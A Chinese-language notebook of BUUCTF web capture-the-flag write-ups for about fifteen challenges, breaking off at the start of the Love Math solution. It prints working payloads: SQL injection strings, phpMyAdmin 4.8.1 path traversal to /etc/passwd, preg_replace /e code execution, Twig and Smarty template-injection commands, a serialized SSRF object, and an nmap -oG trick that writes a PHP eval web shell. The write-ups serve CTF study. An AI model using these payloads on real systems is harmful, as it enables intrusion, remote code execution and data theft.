# BUUCTF

## 1.black_list（堆叠注入）

![image-20230516190257577](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230516190257577.png)

ban了很多，这里可以使用堆叠注入，即闭合了上一句sql语句后再构建一个语句进行查询

查库名:

1'; show databases;#

看这个

http://t.csdn.cn/wYapq

## 2.[BSidesCF 2020]Had a bad day

题目点击两个不同按钮出现不同图片文件，这里考虑是文件包含漏洞，尝试了一下对于index.php进行包含

![image-20230516192352890](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230516192352890.png)

有报错信息

include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in

include(): Failed opening 'php://filter/read=convert.base64-encode/resource=index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in

可以看到这里输入的文件名有两个后缀php，于是把自己输入的那个删掉，得到index.php源码

![image-20230516192920988](https://s1.ax1x.com/2023/05/16/p9R3xDP.png)

传入的category中必须含有woofers,meowers,index才能进行包含

这里就存在一个姿势

/index.php?category=woofers/../flag

它会先访问woofers然后再返回上一级目录，然后再对flag进行访问，真巧妙啊

![image-20230516193929276](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230516193929276.png)

得到flag

## 3.ZJCTF，不过如此（文件包含、preg_replace 的 /e执行代码漏洞）

![image-20230516205559989](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230516205559989.png)

进行代码审计，这里应该是使用文件包含漏洞

要是text中的内容为特定的字符串，那么需要使用data协议进行写入

?text=data://text/plain,I have a dream

然后就是对于file的文件包含了，题目给出提示next.php，使用filter协议read方法进行读取

file=php://filter/read=convert.base64-encode/resource=next.php

得到next源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

通过get方式传入变量id的值

定义了一个函数complex，将变量`$re`、`strtolower("\\1")`、变量`$str`进行拼接替换

通过查阅资料
preg_replace()使用了/e模式，可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。
preg_replac()函数当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。

strtolower("\\1")当中的\\1实际上就是\1 ，这里的\1实际上指定的是第一个子匹配项，而\1在正则表达式中有自己的含义。

反向引用：
对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

所以这里的\1表示的是第一个子匹配项

官方payload给的是 /?.*={${phpinfo()}}

即 GET 方式传入的参数名为 .* ，值为 {${phpinfo()}} 

1. 原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
2. 变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});

如果是在程序中直接运行，那么是一定能成功的，理由如下：

1. `/(.*)/ei` 是正则表达式模式。`(.*)` 表示捕获任意字符序列，并使用 `/e` 修饰符进行评估替换操作。
2. `'strtolower("\\1")'` 是替换的字符串。`\1` 表示正则表达式中捕获的第一个组（即整个匹配）。
3. `${phpinfo()}` 是在替换字符串中使用了花括号括起来的 PHP 代码。`${}` 语法用于将代码的执行结果作为字符串插入。

由于使用了 `/e` 修饰符，正则表达式的替换字符串会被评估为 PHP 代码，并执行其中的函数。在这个例子中，`${phpinfo()}` 将调用 `phpinfo()` 函数，并将其结果作为字符串插入替换后的结果中。

但是这里有bug，url中传入的`.* 在经过解析后会变为 _*`这是由于在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效

下面再说说我们为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：

1. var_dump(phpinfo()); // 结果：布尔 true
2. var_dump(strtolower(phpinfo()));// 结果：字符串 '1'
3. var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'
4. var_dump(preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}'));// 结果：空字符串''
5. var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'));// 结果：空字符串''
6. 这里的'strtolower("{${phpinfo()}}")'执行后相当于 strtolower("{${1}}") 又相当于 strtolower("{null}") 又相当于 '' 空字符串

真不懂，大佬给了个payload

\S*=${phpinfo()} 

问了问chatgpt

![image-20230517091828560](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517091828560.png)

[参考文章](https://www.cesafe.com/html/6999.html)

这里还有个大佬进行了本地测试：

[点这里](https://blog.51cto.com/u_15127511/4382395)

使用了/e执行漏洞触发getflag函数后再向cmd中传入所需的命令即可

## 4.我有一个数据库

只有一段话，抓包后无结果，用dirsearch扫试试

![image-20230517101614753](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517101614753.png)

![image-20230517101637109](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517101637109.png)访问/phpadmin试试

![image-20230517094757185](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517094757185.png)

访问后得知该版本为4.8.1，相关版本有个漏洞

其index.php中存在一处文件包含逻辑

[参考文章](https://www.jianshu.com/p/0d75017c154f)

这篇文章讲述的很清楚

简单来说，就是这个漏洞的源文件（index.php）存在解码漏洞，源码内对url进行了？的分割，在分割前，又对参数进行了urldecode,且如果?号前面的文件就是taget在白名单里，就可以绕过，这样我们一是令target=db_sql.php，而是在传参使对?进行二次url编码，即?变为%253f

访问

/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

有结果，说明存在文件包含漏洞

![image-20230517102010792](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517102010792.png)

构造payload:  url/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag

这是一篇总结了phpmyadmin的文章：

https://blog.csdn.net/weixin_39915668/article/details/115761827

这里发现新大陆，漏洞可以用kali搜记录

![image-20230517103209960](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230517103209960.png)

post传进来的值，变量名会被当作变量名，值当作该变量的值

## 5.easy_web

考点：MD5强碰撞

源代码中提示MD5isfunny，故本题应该是与md5算法有关

![image-20230524105812748](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524105812748.png)

img的值中存在编码 

看了wp后得知是先进行一次hex编码，然后进行两次base64编码，得到的结果是555.png，比较河狸

这里不难联想到文件包含，尝试对于flag进行包含

![image-20230524110821827](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524110821827.png)

能包含成功，虽然不是flag，但是说明思路是没问题的

包含index.php试试

![image-20230524110929721](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524110929721.png)

对其进行解码，得到index的源码

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

这里主要进行rce的是cmd，这里有一个小知识点

$(cmd)和'cmd'

$(cmd)和`cmd`的作用是相同的,在执行一条命令时，会先将其中的 ``，或者是$() 中的语句当作命令执行一遍，再将结果加入到原命令中重新执行，例如：
echo `ls`
会先执行 ls 得到xx.sh等，再替换原命令为：
echo xx.sh

同时这里还考察了MD5强碰撞，放这里

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

![image-20230524113402521](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524113402521.png)

执行成功

因为将cat 、tac 都ban掉了

语句过滤可以使用\绕过  神奇 神奇

空格过滤用编码绕过即可



这里还有别的师傅是用了sort函数（针对文本文件的内容，以行为单位来排序输出) 

 

## 6.Cookie is so stable

点击hint，看到提示

![image-20230524190449300](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524190449300.png)

那么就看看cookie有什么

很好，看不懂，感觉就是正常的cookie啊

![image-20230524191003974](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524191003974.png)

点flag试试

![image-20230524191028027](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524191028027.png)

这个界面，随便输入一个数发现有回显，怀疑这里是ssti

这里发现新大陆，自己一直想着的是通过修改参数然后看结果

看了wp后才知道这里是先登录进去，然后在登录成功的界面刷新抓包，然后看结果![image-20230524193149191](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524193149191.png)

原来cookie的作用在这里啊...

在这里判断下是哪个模板

![img](https://img-blog.csdnimg.cn/img_convert/61b42a16c2b405e6ab1ada36470713f1.png)

输入{{7*‘7’}}，返回49表示是 Twig 模块

输入{{7*‘7’}}，返回7777777表示是 Jinja2 模块

![image-20230524193720773](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524193720773.png)

回显是49，故这里是Twig模板

模板都是有固定paylaod的

这里贴两个

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}//查看id
```

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}//查看flag
```

![image-20230524193823856](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230524193823856.png)

## 7.[安洵杯 2019]easy_serialize_php

给出源码，进行审计

```php
 <?php

$function = @$_GET['f'];//GET传入f参数

function filter($img){//过滤形参为img的值
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){//unset销毁指定变量
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);//把post的参数注册成变量

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){//获取到img_path值，对于guest_img.png进行编码后赋值给变量img
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));//获取到再进行一层sha1加密
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

根据提示查看phpinfo中的信息

![image-20230612102339059](https://s1.ax1x.com/2023/06/12/pCZDjpj.png)

flag应该在该文件中

这里有preg_replace，想到反序列化字符串逃逸

理一下思路，最后肯定是要file_get_contents读取文件的，所以这里的img参数是要变为文件路径的，而这里的img参数肯定不能直接传参得到，因为有过滤，所以另找他法，这里如果img_path进行get传参得到且有值，那么会进行sha1加密，而该加密是不可逆的，所以这里是不能利用的，然后就是session变量，这里存在extract函数，这里可以进行利用

这里本地环境有问题，不进行演示了，具体可看https://www.jianshu.com/p/8e8117f9fd0e，写的挺好

这里大概说一下思路，通过post传参来对extract进行利用，session是一个大数组，其中含有三个属性，分别为user，function，img，这里肯定是要对img进行参数修改从而进行文件包含的。这道题是字符串减少的反序列化字符串逃逸，所以只对于user进行反序列化污染时，传入的payload长度和user字符串的长度始终是相等的，那么就无法进行污染，因为即使是字符串减少了，想要构造后面img参数的污染，字符串的长度显然是不满足的，所以这里可以采取，对于user属性，进行过滤以达到给出空间的效果，然后对于function属性进行传参污染，这样的话呢，user中的任务就是提前构成闭合，也就是将user参数名与function的参数名后面的";进行闭合，数一下字符长度然后进行相应的操作，最后在function中传入function的属性名和属性值（随意）与要包含的值的参数img的属性名和值

ok了，理解的差不多了，

## 8.[NCTF2019]Fake XML cookbook

通过名字猜测这是一个xml文档的外

也就是xxe

抓包，构建恶意代码执行读取文件

![image-20230609192712129](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230609192712129.png)

读取flag

![image-20230609192752057](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230609192752057.png)

这是有回显的，没有回显的可以使用服务器（具体可见曾经做过的ctfshow xxe题）

## 9.Fakebook（sql注入，ssrf）

页面有注册登录的功能，先进行登录看看有什么信息

![image-20230612094129690](https://s1.ax1x.com/2023/06/12/pCZwx6x.png)

点进username后，观察到有参数no

尝试一下sql注入

![image-20230612094151411](https://s1.ax1x.com/2023/06/12/pCZ0pnK.png)

![image-20230612094417428](https://s1.ax1x.com/2023/06/12/pCZ0ejP.png)

注入成功，回显位为第二个，得到数据库名fakebook，表名user，字段名no,username,passwd,data

这里记录一下sql语句的使用(不考虑过滤)

union select 1,database(),3,4--+

union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+

union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users'--+

![image-20230612095614277](https://s1.ax1x.com/2023/06/12/pCZ0jUg.png)

发现data中的内容是序列化后的结果

据大佬wp下载/user.php.bak，得到源码

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);//执行请求
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);//curl_getinfo用于获取指定curl句柄相关的信息，
        //CURLINFO_HTTP_CODE是一个选项常量，用于指定要获取的信息（）
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

![image-20230612095813906](https://s1.ax1x.com/2023/06/12/pCZBV54.png)

这里可能存在ssrf（服务器端请求伪造）

查看内容时，源码![image-20230612095923679](https://s1.ax1x.com/2023/06/12/pCZBux1.png)

对应网页的博客内容，而我们爆出的字段data是序列化后的字符串

说明注册时会序列化我们的信息，回显到页面时再反序列化

这个data本来回显的是我们自己的博客，但我们把它改为回显flag.php就可以构成ssrf

```php
<?php
class UserInfo {
    public $name = "test111";
    public $age = 222;
    public $blog = "file:///var/www/html/flag.php";
}

$data = new UserInfo();
echo serialize($data);
?>
```

flag的路径是怎么得知的呢？

上面的bao报错可得到这样一个路径

<img src="https://s1.ax1x.com/2023/06/12/pCZDCJH.png" alt="image-20230612100606606" style="zoom:200%;" />

通常这种题目就是/flag.php或者如上，猜就好



查看源码，点进我们包含的内容

![image-20230612100702664](https://s1.ax1x.com/2023/06/12/pCZDFSA.png)

![image-20230612100720903](https://s1.ax1x.com/2023/06/12/pCZDkQI.png)

得到flag

## 10.	[BUUCTF 2018]Online Tool（命令执行）

源代码

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
//效验ip地址
if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

server是一个php超全局变量，用于存储与服务器和当前脚本环境的相关信息

当使用 `escapeshellarg` 函数处理字符串时，它会将字符串包裹在单引号 `'` 中，并对其中的特殊字符进行转义，例如空格、引号、反斜杠等。这样可以确保字符串在命令行环境中被正确解析，而不会被误认为是命令的一部分。

```php
$arg = "some argument with spaces";
$escapedArg = escapeshellarg($arg);

// 输出：'some argument with spaces'
echo $escapedArg;
```

当使用 `escapeshellcmd` 函数处理字符串时，它会对字符串中的特殊字符进行转义，例如空格、分号、管道符等。这样可以确保整个命令字符串在命令行环境中被正确解析，而不会被误认为是多个命令或参数的组合。

```php
$command = "ls -l /path/with spaces";

$escapedCommand = escapeshellcmd($command);

// 输出：ls\ -l\ /path/with\ spaces
echo $escapedCommand;
```

如果没有这两个函数的过滤，问题就简单很多了，直接使用命令管道符  |（将前一个命令的输出当作第二个命令的输入）  ||（前一个命令执行失败才会执行后一个命令）&（依次执行命令）&&（前一个命令执行成功，后一个命令才会执行）

但是escapeshellcmd()就是用来阻止多参数命令执行的，因为一整个传参的内容都被当作字符串了，虽然命令语句只能执行一个，但是可以指定不同参数，

```php
$username = 'myuser1 myuser2';
system('groups '.$username);
=>
//myuser1 : myuser1 adm cdrom sudo
//myuser2 : myuser2 adm cdrom sudo
```

但是在escapeshellarg()函数处理后，就会被当做一个参数来执行命令了。

具体可查看该篇文章（很多利用方式也都有记录，这里先不看了）

https://www.anquanke.com/post/id/107336



已知的绕过/利用

从上一章可以看到，使用`escapeshellcmd / escapeshellarg`时不可能执行第二个命令。
但是我们仍然可以将参数传递给第一个命令。
这意味着我们也可以将新选项传递给命令。
利用漏洞的能力取决于目标可执行文件。

贴一个大佬的例子（通俗易懂）

```php
传入的参数是：172.17.0.2' -v -d a=1
经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
```

这里自己总结一下

通过在字符串中间加单引号，使得其经过escapeshellarg处理后单引号前有 \ 来转义单引号，同时两边又会有一对单引号进行链接，与此同时，字符串的前后都会加上单引号，而在接下来secapeshellcmd中处理时，会将最前面的单引号与之前本来用于连接的单引号进行配对，对反斜杠进行转义，变成了两个反斜杠，自己传入的单引号与之前构成连接的单引号进行配对，使得成为了一个空格，最后的单引号没有配对，又有反斜杠进行了转义，这样的话最终的命令就变成了`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为\了而不是转义字符，那么之前的 ' 后面的’就不会被转义了，也就是配对成了空白连接符，总的目的就是把单引号放出来构成了空格

回到本题，本题的命令是nmap

![image-20230613094519944](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230613094519944.png)

nmap中存在-oG参数，可以将代码与命令写入到文件中，比如`nmap <?php phpinfo();?> -oG 1.php`，就是将这个phpinfo();语句写在了1.php里内了。

所以这里可以构造payload

```php
?host=' <?php eval($_POST["a"]);?> -oG 1.php '
```

注意单引号后，单引号前是有空格的

这里再简要分析一下吧，经过arg过滤后变为

```php
?host=''\'' <?php eval($_POST["a"]);?> -oG 1.php\ '\'''
```

经过cmd

```php
?host=''\'' \<\?php eval($_POST["a"]);\?\> -oG 1.php '\\'''
```

等价于

```php
?host=\<\?php eval($_POST["mayi"])\;\?\> -oG 1.php \\
```

```
根据解析规则
# 等价于  \<\?php eval($_POST["mayi"])\;\?\> -oG 1.php
# 写入后  <?php @eval($_POST["mayi"]);?> -oG mayi.php
```

连接到命令就是

```php
nmap -T5 -sT -Pn --host-timeout 2 -F  \ \<?php eval($_POST["a"]);?>\ -oG 1.php
```

参考

https://mayi077.gitee.io/2020/07/30/BUUCTF-2018-Online-Tool/

在windows下\是用^脱字符代表，不同操作系统下escapeshellcmd有不同的转义行为

在 Windows 环境下：

```
phpCopy code$cmd = 'dir "C:\Program Files"';
$escapedCmd = escapeshellcmd($cmd);
echo $escapedCmd;
```

输出结果：

```
bashCopy code
dir ^"C:\Program Files^"
```

在 Linux 或 macOS 环境下：

```
phpCopy code$cmd = 'ls /usr/local/bin';
$escapedCmd = escapeshellcmd($cmd);
echo $escapedCmd;
```

输出结果：

```
bashCopy code
ls /usr/local/bin
```

可以看到，在 Windows 环境下，`escapeshellcmd` 函数将双引号 `"` 转义为脱字符 `^`，而在 Linux 或 macOS 环境下，双引号不会被转义。这是因为不同的操作系统对于命令行参数的转义规则有所差异。

## 11.[网鼎杯 2020 朱雀组]phpweb

点进连接

![image-20230613191737353](https://s1.ax1x.com/2023/06/13/pCms0Zq.png)

发现几秒会刷新一次，前面是报错信息后面是时间

抓包

![image-20230613191910280](https://s1.ax1x.com/2023/06/13/pCmshe1.png)

发现存在两个参数，这里如果敏感一点可以发现这里的date是一个函数，与后面的p参数里面的值连接可以

表示当前时间

![image-20230613192011018](https://s1.ax1x.com/2023/06/13/pCms5o6.png)

猜测这里的前一个参数是要执行的函数，后面的参数是函数所需的参数值

使用file_get_content得到index源码

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

call_user_func

`call_user_func` 是一个 PHP 函数，用于调用一个回调函数。它接受一个回调函数作为第一个参数，可以是函数名的字符串、一个匿名函数或一个类方法的数组。

过滤了很多可执行的函数

但是还有一个很特殊的-----unserialize没有被过滤

给func传值unserialize，给后面的参数值传序列化后想执行的操作

这里有一个test类可以利用

![image-20230613192421312](https://s1.ax1x.com/2023/06/13/pCmyilQ.png)

不再赘述

这是见过的唯一一道不生硬的反序列化，很有意思

## 12.[网鼎杯 2020 朱雀组]Nmap 1

和10基本上相同，都是考察了namp命令的执行来写入一句话木马

重要的是-oG

这关略有不同，过滤了php，可以用phtml代替

## 13.[CISCN2019 华东南赛区]Web11（smarty模板ssti）

进入页面，一开始只看到了右上角的ip，修改xff头为本地ip，发现没有别的回显

![image-20230614105835596](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614105835596.png)

一头雾水，看了师傅们wp

最下面有一行小字“build with smarty”

意思是用smarty模板简历，之前还碰到过一次这个题（第六题）

第六题是在cookie里面进行传入paylaod，那么这道题应该就是通过xff头了。再把这张图贴出来看一下

![image-20230614110225114](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614110225114.png)

依次判断

![image-20230614110428261](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614110428261.png)

![image-20230614110437552](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614110437552.png)

<img src="C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614110616383.png" alt="image-20230614110616383" style="zoom: 80%;" />

![image-20230614110629306](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614110629306.png)

所以这道题是smarty模板，模板都是有固定paylaod的，上网搜一下

https://blog.csdn.net/snowlyzz/article/details/124541886

贴个链接

这里使用的是smarty模板中if标签的使用（{if}标签中可以执行php语句）

```
X-Forwarded-For:{if readfile('/flag')}{/if}
```

## 14.[SWPU2019]Web1（sql注入）

这道题挺阴间的，主要学到的呢就是sql注入时对于一些字符串进行过滤时如何选择另一种去绕过

or被过滤时，order和information都不能使用了，此时可以使用

​	1.gropp by代替order by

![image-20230614175645211](C:\Users\35575\AppData\Roaming\Typora\typora-user-images\image-20230614175645211.png)

这里要注入后面传入的  , 和 ' 这是必不可少的，当然两个构成闭合的单引号间可以加符号，这里代表的是group by对于数据进行查询后的结果之间用 单引号间所含的符号 来进行分割

​	2.innodb_index_stats和 innodb_table_stats代替information

采用来进行绕过。payload：

```sql
1'union/**/select/**/1,2,group_concat(table_name),4/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='web1'&&'1'='1
```

来看看含有information的是什么，两者之间的差别

```sql
1‘union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'--+
```

但是因为没有字段信息可以查，使用无列名注入直接查内容

```sql
title='union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22&content=mochu7&ac=add
```

[无列名注入总结](https://blog.csdn.net/m0_46230316/article/details/106668182?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168673809116800213048483%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168673809116800213048483&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-106668182-null-null.142^v88^control_2,239^v2^insert_chatgpt&utm_term=%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)

本题wp：

https://blog.csdn.net/mochu7777777/article/details/127005944

## 15.[CISCN 2019 初赛]Love Math（构造字符串）

源代码

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

不难看出这是一道构造rce的题

这里有加个php特点要知道

- **动态函数**

  php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数
  例如：`$function = "sayHello";$function();`

- **php中函数名默认为字符串**

  例如本题白名单中的`asinh`和`pi`可以直接异或，这就增加了构造字符的选择

给出大佬的两个思路

思路一

80个字符比较少，想办法构造`$_GET[1]`再传参getflag，但是其实发现构造这个好像更难。。。因为`$`、`_`、`[`、`]`都不能用，同时`GET`必须是大写，很难直接构造。
一种payload是这样

